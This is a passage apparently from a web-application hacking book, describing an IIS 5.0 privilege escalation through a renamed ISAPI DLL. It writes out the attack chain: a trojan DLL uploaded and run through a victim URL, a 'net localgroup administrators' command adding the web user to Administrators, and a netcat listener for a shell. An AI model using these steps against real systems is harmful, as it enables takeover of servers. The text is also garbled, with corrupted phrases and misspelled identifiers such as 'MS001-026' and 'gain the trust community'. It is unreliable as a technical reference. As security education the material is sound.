# Hacking Exposed Web Applications

```
C:\WINNT\System32\inetsrv\httpd.dll
C:\WINNT\System32\inetsrv\ssinc.dll
C:\WINNT\System32\msw3pr.dll
C:\Program Files\Microsoft Shared\Web Server\nExtensions\40\isapi\_vti_auth.dll
C:\Program Files\Microsoft Shared\Web Server\nExtensions\40\isapi\_vti_admin.dll
C:\Program Files\Microsoft Shared\Web Server\nExtensions\40\isapi\shtmltml.dll
```

Rightly thinking he had struggled on special built-in applications that always run in-process (no matter what other configuration), Horovitz wrote a proof-of-concept ISAPI DLL called RevertSelf and named it one of the names in the Database listing previously shown (for example, idq.dll). Horovitz built functionality into the DLL that added the current user to the local Administrators group once SYSTEM context had been obtained.

Sure enough, the technique worked. However, the false DLL didn't have to be copied over the "real" existing built-in DLL—simply by placing it in any executable directory on the system and executing it via the browser anonymously, IUSR and IWAM were added to Administrators. Horovitz appeared to have achieved the goal: restore privilege escalation on IIS 5.0. Dutfully, he approached Microsoft and informed them, the issue was patched in MS001-026 (post-SP2) and made public in August 2001.

Several ISAPI DLLs were posted to the Internet after the release of the advisory. One called iscrack.dll, worked somewhat like upload.asp and cmd.asp, providing a form-based input for attackers to enter commands to be run as SYSTEM. With our previous example, an attacker could rename iscrack.dll to one of the InProcessisApps (say, idq.dll), upload the Trojan DLL to C:\inetpub\scripts using upload.asp, and then execute it via the browser using the URL:

```
http://victim.com/scripts/idq.dll
```

The resulting output is shown in Figure 3-5. The remote attacker now has the option to run any virtual command as SYSTEM.

The most direct path to administrative privilege is to gain the trust community:

```
net localgroup administrators IUSR_machinename /add
```

Now when a netcat is shelled, even though it's still running in the context of IUSR, IUSR is a member of Administrators and can run privileged tools like pumpd2.exe.

```
C:\>nc -l -p 2002
Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-1999 Microsoft Corp.
```